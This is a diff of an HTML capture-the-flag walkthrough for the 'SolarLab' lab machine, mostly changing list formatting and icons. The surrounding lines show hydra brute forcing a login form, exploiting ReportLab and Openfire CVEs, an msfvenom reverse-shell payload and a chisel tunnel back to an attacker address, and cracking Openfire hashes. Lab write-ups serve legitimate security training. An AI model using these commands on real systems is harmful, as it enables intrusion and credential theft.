@@ -323,26 +323,18 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 <p><img src="/images/box-images/SolarLab/SolarLab_SMB_Shares_Connect.png" /></p>
 
 <ul>
-  <li>We have another directory:
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">concepts</code></li>
-    </ul>
+  <li>We have another directory:<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">concepts</code></li>
+  <li>
+    <p>Also we have some files we can exfil:<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">details-file.xlsx</code><br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">old_leave_request_form.docx</code></p>
   </li>
-  <li>Also we have some files we can exfil:
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">details-file.xlsx</code></li>
-      <li><code class="language-plaintext highlighter-rouge">old_leave_request_form.docx</code></li>
-    </ul>
-  </li>
-  <li>Change directories to <code class="language-plaintext highlighter-rouge">concepts</code> and we see 2 more files:
-    <ul>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">Training-Request-Form.docx</code></p>
-      </li>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">Travel-Request-Sample.docx</code></p>
-      </li>
-    </ul>
+  <li>
+    <p>Change directories to <code class="language-plaintext highlighter-rouge">concepts</code> and we see 2 more files:<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">Training-Request-Form.docx</code><br /></p>
+
+    <p><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">Travel-Request-Sample.docx</code></p>
   </li>
 </ul>
 
@@ -370,19 +362,16 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb 10.129.19.24 -u 'anonymous' -p '' --rid-brute
 </code></pre></div></div>
 
-<p><img src="/images/box-images/SolarLab/SolarLab_SMB_RIDBrute.png" /></p>
+<p><img src="/images/box-images/SolarLab/SolarLab_SMB_RIDBrute.png" class="resize2" /></p>
 <ul>
   <li>We can see <code class="language-plaintext highlighter-rouge">blake</code> is indeed a user that has access to the share. Using the Password dumped form the <code class="language-plaintext highlighter-rouge">xlsx</code> sheet we can indeed access the share using <code class="language-plaintext highlighter-rouge">blake</code></li>
 </ul>
 
 <h2 id="hydra">Hydra:</h2>
 <ul>
-  <li>Export the username and passwords from the <code class="language-plaintext highlighter-rouge">xlsx</code> too (2) text files so we can use them in some brute forcing attempts.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">userSolarLabs.txt</code></li>
-      <li><code class="language-plaintext highlighter-rouge">passwordsSolarLabs.txt</code></li>
-    </ul>
-  </li>
+  <li>Export the username and passwords from the <code class="language-plaintext highlighter-rouge">xlsx</code> too (2) text files so we can use them in some brute forcing attempts.<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">userSolarLabs.txt</code><br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">passwordsSolarLabs.txt</code></li>
   <li>Next lets run these lists against the <code class="language-plaintext highlighter-rouge">report.solarlab.htb</code> page with <code class="language-plaintext highlighter-rouge">hydra</code> and see if we get valid user hits.</li>
 </ul>
 
@@ -393,15 +382,12 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
   <li>We do get some valid user returns.</li>
 </ul>
 
-<p><img src="/images/box-images/SolarLab/SolarLab_Hydra_Users.png" /></p>
+<p><img src="/images/box-images/SolarLab/SolarLab_Hydra_Users.png" class="resize2" /></p>
 
 <ul>
   <li>We can see a pattern with these names. <code class="language-plaintext highlighter-rouge">Firstname,LastLetterofName</code>. We dont see <code class="language-plaintext highlighter-rouge">blake</code> in this list. Because in our list his name doesn’t include his last name letter.</li>
-  <li>Change our <code class="language-plaintext highlighter-rouge">-L</code> parameter in our <code class="language-plaintext highlighter-rouge">hydra command</code> to <code class="language-plaintext highlighter-rouge">-l BlakeB</code> and see if we return a valid login.
-    <ul>
-      <li>NOTICE: its a <code class="language-plaintext highlighter-rouge">lowercase -l instead of -L when doing a direct user and not a list</code>.</li>
-    </ul>
-  </li>
+  <li>Change our <code class="language-plaintext highlighter-rouge">-L</code> parameter in our <code class="language-plaintext highlighter-rouge">hydra command</code> to <code class="language-plaintext highlighter-rouge">-l BlakeB</code> and see if we return a valid login.<br />
+  <i class="fa-solid fa-triangle-exclamation fa-xl" style="color: #fb4934;"></i> <b>NOTICE:</b> its a <code class="language-plaintext highlighter-rouge">lowercase -l instead of -L when doing a direct user and not a list</code>.</li>
 </ul>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l BlakeB -P passwordsSolarlab.txt report.solarlab.htb -s 6791 http-post-form "/login:username=^USER^&amp;password=^PASS^&amp;enter=Login:User not found." -V
@@ -412,29 +398,27 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
   <li>We get some hits.</li>
 </ul>
 
-<p><img src="/images/box-images/SolarLab/SolarLab_Hydra_BlakeB.png" /></p>
+<p><img src="/images/box-images/SolarLab/SolarLab_Hydra_BlakeB.png" class="resize2" /></p>
 
 <h2 id="reports-login">Reports Login:</h2>
 <ul>
   <li>Now we have a valid login lets login to the webpage at <code class="language-plaintext highlighter-rouge">report.solarlab.htb:6791</code>.</li>
-  <li>We manage to login with <code class="language-plaintext highlighter-rouge">BlakeB</code> <code class="language-plaintext highlighter-rouge">ThisCanB3typedeasily1@</code></li>
+  <li>We manage to login with <strong>USER:</strong> <code class="language-plaintext highlighter-rouge">BlakeB</code> <strong>PASSWORD:</strong> <code class="language-plaintext highlighter-rouge">ThisCanB3typedeasily1@</code></li>
 </ul>
 
-<p><img src="/images/box-images/SolarLab/SolarLab_Report_Login.png" /></p>
+<p><img src="/images/box-images/SolarLab/SolarLab_Report_Login.png" class="resize" /></p>
 
 <ul>
   <li>Each of these options on this page seems to generate a <code class="language-plaintext highlighter-rouge">pdf</code> file.</li>
 </ul>
 
-<p><img src="/images/box-images/SolarLab/SolarLab_Report_PDF_Example.png" /></p>
+<p><img src="/images/box-images/SolarLab/SolarLab_Report_PDF_Example.png" class="resize" /></p>
 
 <ul>
   <li>Googling <code class="language-plaintext highlighter-rouge">reportlab pdf cve</code> we actually get a <code class="language-plaintext highlighter-rouge">CVE</code> related to this functionality.
-    <h2 id="cve-202333733">CVE-2023–33733:</h2>
-  </li>
-  <li><strong>POC</strong>: https://github.com/c53elyas/CVE-2023-33733</li>
-  <li>
-    <p><strong>CVE</strong>: https://nvd.nist.gov/vuln/detail/CVE-2023-33733</p>
+    <h2 id="cve-202333733">CVE-2023–33733:<br /></h2>
+    <p><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://github.com/c53elyas/CVE-2023-33733"><strong>POC</strong>: https://github.com/c53elyas/CVE-2023-33733</a><br />
+<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33733"> <strong>CVE</strong>: https://nvd.nist.gov/vuln/detail/CVE-2023-33733 </a><br /></p>
   </li>
   <li>Reading ahead this appears to be our foothold path. We should be able to perform code execution with this PoC.</li>
 </ul>
@@ -470,13 +454,10 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 
 </code></pre></div></div>
 
+<p><i class="fa-solid fa-triangle-exclamation fa-xl" style="color: #fb4934;"></i> <b>NOTICE:</b> The <code class="language-plaintext highlighter-rouge">POC</code> has <code class="language-plaintext highlighter-rouge">&lt;PARA&gt;</code> in the exploit. I had to change those flags to <code class="language-plaintext highlighter-rouge">&lt;p&gt; &lt;/p&gt;</code> in order for the exploit to work. I don’t understand why but if you have issues in processing the exploit then try that.</p>
+
 <ul>
-  <li>
-    <p><strong>NOTICE:</strong> The <code class="language-plaintext highlighter-rouge">POC</code> has <code class="language-plaintext highlighter-rouge">&lt;PARA&gt;</code> in the exploit. I had to change those flags to <code class="language-plaintext highlighter-rouge">&lt;p&gt; &lt;/p&gt;</code> in order for the exploit to work. I don’t understand why but if you have issues in processing the exploit then try that.</p>
-  </li>
-  <li>
-    <p>We successfully land on the victim as <code class="language-plaintext highlighter-rouge">blake</code>.</p>
-  </li>
+  <li>We successfully land on the victim as <code class="language-plaintext highlighter-rouge">blake</code>.</li>
 </ul>
 
 <p><img src="/images/box-images/SolarLab/SolarLab_Blake_Foothold.png" /></p>
@@ -496,23 +477,21 @@ Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
 
 <ul>
   <li>Lets download this <code class="language-plaintext highlighter-rouge">users.db</code> file and explore it.</li>
-  <li>I switched over to a meterpreter session for easier exfil.
-    <ul>
-      <li>Make a msfvenom payload:</li>
-    </ul>
-  </li>
+  <li>I switched over to a meterpreter session for easier exfil.<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Make a msfvenom payload:</li>
 </ul>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=10.10.14.x LPORT=37347 &gt; shell.exe
 </code></pre></div></div>
 
 <ul>
-  <li>Make a directory on the victim under <code class="language-plaintext highlighter-rouge">C:\</code> then <code class="language-plaintext highlighter-rouge">wget</code> your payload to the victim and run it.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">mkdir temp</code></li>
-    </ul>
+  <li>
+    <p>Make a directory on the victim under <code class="language-plaintext highlighter-rouge">C:\</code> then <code class="language-plaintext highlighter-rouge">wget</code> your payload to the victim and run it.<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">mkdir temp</code></p>
   </li>
-  <li>Now we can just use the <code class="language-plaintext highlighter-rouge">download</code> function of meterpreter and get the file.</li>
+  <li>
+    <p>Now we can just use the <code class="language-plaintext highlighter-rouge">download</code> function of meterpreter and get the file.</p>
+  </li>
 </ul>
 
 <p><img src="/images/box-images/SolarLab/SolarLab_Usersdb_Exfil.png" /></p>
@@ -551,11 +530,8 @@ sqlite&gt; select * from user;
 
 <h2 id="openfire">OpenFire:</h2>
 <ul>
-  <li>Looking around in program files we see an interesting app.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">OpenFire</code></li>
-    </ul>
-  </li>
+  <li>Looking around in program files we see an interesting app.<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">OpenFire</code></li>
 </ul>
 
 <p><img src="/images/box-images/SolarLab/SolarLab_OpenFire_Discovery.png" /></p>
@@ -629,11 +605,8 @@ sqlite&gt; select * from user;
 </code></pre></div></div>
 
 <ul>
-  <li>Next, on the victim lets run the following command in our meterpreter session to create a background process to keep this ports open and forwarded.
-    <ul>
-      <li>Make sure to change the ip address to match your box.</li>
-    </ul>
-  </li>
+  <li>Next, on the victim lets run the following command in our meterpreter session to create a background process to keep this ports open and forwarded.<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Make sure to change the ip address to match your box.</li>
 </ul>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>execute -f C:\\temp\\chisel.exe -a "client 10.10.14.70:37373 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091"
@@ -655,26 +628,21 @@ sqlite&gt; select * from user;
 <ul>
   <li>Attempting some basic user/password combos is unsuccessful.</li>
   <li>Attempting to use the passwords and accounts found earlier in the <code class="language-plaintext highlighter-rouge">user.db</code> doesn’t seem to work either.</li>
-  <li>The only thing we have going for us now is that we can see what version of <code class="language-plaintext highlighter-rouge">openfire</code> is running
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">Openfire, Version: 4.7.4</code></li>
-    </ul>
+  <li>
+    <p>The only thing we have going for us now is that we can see what version of <code class="language-plaintext highlighter-rouge">openfire</code> is running<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">Openfire, Version: 4.7.4</code></p>
   </li>
   <li>Maybe there’s a CVE related to this version.</li>
 </ul>
 
 <h2 id="cve-2023-32315">CVE-2023-32315:</h2>
 <ul>
-  <li>We find a <code class="language-plaintext highlighter-rouge">RCE LOGIN BYPASS</code> cve for this version of openfire.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">CVE-2023-32315</code></li>
-      <li>https://nvd.nist.gov/vuln/detail/CVE-2023-32315</li>
-    </ul>
-  </li>
-  <li>There is also a POC for this cve.
-    <ul>
-      <li>https://github.com/miko550/CVE-2023-32315</li>
-    </ul>
+  <li>We find a <code class="language-plaintext highlighter-rouge">RCE LOGIN BYPASS</code> cve for this version of openfire.<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <code class="language-plaintext highlighter-rouge">CVE-2023-32315</code><br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32315">https://nvd.nist.gov/vuln/detail/CVE-2023-32315</a><br /></li>
+  <li>
+    <p>There is also a POC for this cve.<br />
+  <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://github.com/miko550/CVE-2023-32315">https://github.com/miko550/CVE-2023-32315</a></p>
   </li>
   <li>
     <p><strong>Explanation:</strong> Openfire’s administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users.</p>
@@ -744,8 +712,9 @@ sqlite&gt; select * from user;
   <li>It turns out this hash is uncommon and not in hashcat.</li>
   <li>
     <p>Looking around github though we find a java tool that someone made to decrypt openfire hashes.</p>
+
+    <p><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://github.com/c0rdis/openfire_decrypt">https://github.com/c0rdis/openfire_decrypt</a><br /></p>
   </li>
-  <li>https://github.com/c0rdis/openfire_decrypt</li>
   <li>
     <p>Clone this tool over to your attack box and lets see if we can decrypt it now.</p>
   </li>
@@ -779,9 +748,7 @@ sqlite&gt; select * from user;
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java OpenfireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
 </code></pre></div></div>
 
-<ul>
-  <li><strong>NOTICE:</strong> I had issues of the java program not finding the <code class="language-plaintext highlighter-rouge">class</code> which was located in the same folder where I cloned from github. If you have this issue just run the command like this instead.</li>
-</ul>
+<p><i class="fa-solid fa-triangle-exclamation fa-xl" style="color: #fb4934;"></i> <b>NOTICE:</b> I had issues of the java program not finding the <code class="language-plaintext highlighter-rouge">class</code> which was located in the same folder where I cloned from github. If you have this issue just run the command like this instead.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -cp . OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
 </code></pre></div></div>
